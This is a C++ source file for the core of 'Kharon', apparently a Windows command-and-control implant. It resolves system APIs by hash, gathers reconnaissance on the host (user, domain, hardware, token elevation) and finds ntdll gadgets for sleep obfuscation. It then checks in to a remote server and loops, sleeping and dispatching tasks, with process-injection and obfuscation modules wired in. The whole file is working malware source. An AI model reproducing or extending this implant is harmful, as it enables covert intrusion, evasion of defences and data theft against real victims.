#include <Kharon.h>

using namespace Root;

EXTERN_C DECLFN auto Main(
    _In_ UPTR Argument
) -> VOID {
    Kharon Kh;

    Library   KhLibrary( &Kh );
    Heap      KhHeap( &Kh );
    Process   KhProcess( &Kh );
    Thread    KhThread( &Kh );
    Task      KhTask( &Kh );
    Transfer  KhTransfer( &Kh );
    Package   KhPackage( &Kh );
    Parser    KhParser( &Kh );
    Injection KhInjection( &Kh );
    Obfuscate KhObfuscate( &Kh );
 
    Kh.InitHeap( &KhHeap );
    Kh.InitLibrary( &KhLibrary );

    Kh.Init();

    Kh.InitInjection( &KhInjection );
    Kh.InitObfuscate( &KhObfuscate );
    Kh.InitProcess( &KhProcess );
    Kh.InitTask( &KhTask );
    Kh.InitTransfer( &KhTransfer );
    Kh.InitThread( &KhThread );
    Kh.InitPackage( &KhPackage );
    Kh.InitParser( &KhParser );

    Kh.Start( Argument );

    return;
}

DECLFN Kharon::Kharon( VOID ) {
    if ( Session.Base.Start ) return;

    /* ========= [ get base ] ========= */
    Session.Base.Start  = StartPtr();
    Session.Base.Length = ( EndPtr() - Session.Base.Start );

    /* ========= [ init modules and funcs ] ========= */
    Krnl32.Handle = LdrLoad::Module( Hsh::Str<CHAR>( "kernel32.dll" ) );
    Ntdll.Handle  = LdrLoad::Module( Hsh::Str<CHAR>( "ntdll.dll" ) );

    RSL_IMP( Ntdll  );
    RSL_IMP( Krnl32 );
}

auto DECLFN Kharon::Init(
    VOID
) -> void {
    /* ========= [ init modules and funcs ] ========= */
    Advapi32.Handle = LdrLoad::Module( Hsh::Str<CHAR>( "advapi32.dll" ) );
    Wininet.Handle  = LdrLoad::Module( Hsh::Str<CHAR>( "wininet.dll" ) );

    if ( !Advapi32.Handle ) Advapi32.Handle = Lib->Load( "advapi32.dll" );
    if ( !Wininet.Handle  ) Wininet.Handle  = Lib->Load( "wininet.dll" );

    RSL_IMP( Advapi32 );
    RSL_IMP( Wininet  );

    KhDbgz( "library kernel32.dll loaded at %p and functions resolveds", Krnl32.Handle   );
    KhDbgz( "library ntdll.dll    loaded at %p and functions resolveds", Ntdll.Handle    );
    KhDbgz( "library advapi32.dll loaded at %p and functions resolveds", Advapi32.Handle );
    KhDbgz( "library wininet.dll  loaded at %p and functions resolveds", Wininet.Handle  );

    // InjCtx.Pipe.Length = Str::LengthA( InjCtx.Pipe.Name  );

    // /* ========= [ informations collection ] ========= */
    ULONG  TmpVal       = 0;
    ULONG  TokenInfoLen = 0;
    HANDLE TokenHandle  = NULL;
    BOOL   Success      = FALSE;
    CHAR   cProcessorName[MAX_PATH] = { 0 };
    HKEY   KeyHandle         = NULL;
    ULONG  ProcBufferSize    = sizeof( cProcessorName );
    PSTR   cProcessorNameReg = "HARDWARE\\DESCRIPTION\\System\\CentralProcessor\\0";

    SYSTEM_INFO     SysInfo   = { 0 };
    MEMORYSTATUSEX  MemInfoEx = { 0 };
    TOKEN_ELEVATION Elevation = { 0 };

    PROCESS_EXTENDED_BASIC_INFORMATION PsBasicInfoEx = { 0 };

    MemInfoEx.dwLength = sizeof( MEMORYSTATUSEX );

    Ntdll.NtQueryInformationProcess( 
        NtCurrentProcess(), ProcessBasicInformation, 
        &PsBasicInfoEx, sizeof( PsBasicInfoEx ), NULL 
    );

    Krnl32.GlobalMemoryStatusEx( &MemInfoEx );
    Krnl32.GetNativeSystemInfo( &SysInfo );

	if ( 
		SysInfo.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_AMD64 || 
		SysInfo.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_IA64
	) {
		Machine.OsArch = 0x64;
	} else {
		Machine.OsArch = 0x86;
	}

    Machine.ProcessorsNbr = SysInfo.dwNumberOfProcessors;

    Session.ProcessID = HandleToUlong( NtCurrentTeb()->ClientId.UniqueProcess );
    Session.ThreadID  = HandleToUlong( NtCurrentTeb()->ClientId.UniqueThread );
    Session.ParentID  = HandleToUlong( PsBasicInfoEx.BasicInfo.InheritedFromUniqueProcessId );

    Transport.Web.Secure = FALSE;

    Session.ImagePath   = A_PTR( Hp->Alloc( MAX_PATH ) );
    Session.CommandLine = A_PTR( Hp->Alloc( MAX_PATH ) );

    Str::WCharToChar( Session.ImagePath, PsBasicInfoEx.PebBaseAddress->ProcessParameters->ImagePathName.Buffer, Str::LengthW( PsBasicInfoEx.PebBaseAddress->ProcessParameters->ImagePathName.Buffer ) );
    Str::WCharToChar( Session.CommandLine, PsBasicInfoEx.PebBaseAddress->ProcessParameters->CommandLine.Buffer, Str::LengthW( PsBasicInfoEx.PebBaseAddress->ProcessParameters->CommandLine.Buffer ) );

    Success = Advapi32.OpenProcessToken( NtCurrentProcess(), TOKEN_QUERY, &TokenHandle );
    Success = Advapi32.GetTokenInformation( TokenHandle, TokenElevation, &Elevation, sizeof( Elevation ), &TokenInfoLen );

    Machine.TotalRAM   = ( MemInfoEx.ullTotalPhys / ( 1024*1024 ) );
    Machine.AvalRAM    = ( MemInfoEx.ullAvailPhys / ( 1024*1024 ) );
    Machine.UsedRAM    = ( ( MemInfoEx.ullTotalPhys / ( 1024*1024 ) ) - ( MemInfoEx.ullAvailPhys / ( 1024*1024 ) ) );;
    Machine.PercentRAM = MemInfoEx.dwMemoryLoad;

    Success = Krnl32.GetComputerNameExA( ComputerNameDnsHostname, NULL, &TmpVal );
    if ( !Success ) {
        Machine.CompName = (PCHAR)Hp->Alloc( TmpVal );
        Krnl32.GetComputerNameExA( ComputerNameDnsHostname, Machine.CompName, &TmpVal );
    }

    Success = Krnl32.GetComputerNameExA( ComputerNameDnsDomain, NULL, &TmpVal );
    if ( !Success ) {
        Machine.DomName = (PCHAR)Hp->Alloc( TmpVal );
        Krnl32.GetComputerNameExA( ComputerNameDnsDomain, Machine.DomName, &TmpVal );
    }

    Success = Krnl32.GetComputerNameExA( ComputerNameNetBIOS, NULL, &TmpVal );
    if ( !Success ) {
        Machine.NetBios = (PCHAR)Hp->Alloc( TmpVal );
        Krnl32.GetComputerNameExA( ComputerNameNetBIOS, A_PTR( Machine.NetBios ), &TmpVal );
    }

    Machine.UserName = (PCHAR)Hp->Alloc( TmpVal );
    Advapi32.GetUserNameA( Machine.UserName, &TmpVal );
    
    Advapi32.RegOpenKeyExA( 
        HKEY_LOCAL_MACHINE, cProcessorNameReg,
        0, KEY_READ, &KeyHandle
    );

    Advapi32.RegQueryValueExA(
        KeyHandle, "ProcessorNameString", NULL, NULL,
        B_PTR( cProcessorName ), &ProcBufferSize
    );

    Machine.ProcessorName = cProcessorName;
    
    Mask.NtContinueGadget = ( LdrLoad::_Api( Ntdll.Handle, Hsh::Str( "LdrInitializeThunk" ) ) + 19 );
    Mask.JmpGadget        = Obf->FindGadget( Ntdll.Handle, 0x23 );

    KhDbgz( "agent id: %s", Session.AgentID );
    KhDbgz( "image path: %s", Session.ImagePath );
    KhDbgz( "command line: %s", Session.CommandLine );
    KhDbgz( "process id: %d", Session.ProcessID );
    KhDbgz( "parent id: %d", Session.ParentID );

    KhDbgz( "user name: %s", Machine.UserName );
    KhDbgz( "computer name: %s", Machine.CompName );
    KhDbgz( "net bios: %s", Machine.NetBios );
    KhDbgz( "processor name: %s", Machine.ProcessorName );
    KhDbgz( "total ram: %d", Machine.TotalRAM );
    KhDbgz( "aval ram: %d", Machine.AvalRAM );
    KhDbgz( "used ram: %d", Machine.UsedRAM );

    KhDbgz( "host: %S", Transport.Web.Host );
    KhDbgz( "port: %d", Transport.Web.Port );
    KhDbgz( "endpoint: %S", Transport.Web.EndPoint );
    KhDbgz( "user agent: %S", Transport.Web.UserAgent );
    KhDbgz( "secure: %d", Transport.Web.Secure );

    KhDbgz( "collected informations from environment" );

    return;
}

auto DECLFN Kharon::Start( 
    _In_ UPTR Argument 
) -> VOID {
    BOOL Success = FALSE;
    
    KhDbgz( "initializing the principal routine" );

    Success = Tf->Checkin();

    do {            
        Obf->Main( Session.SleepTime );

        Tk->Dispatcher();
    } while( 1 );
}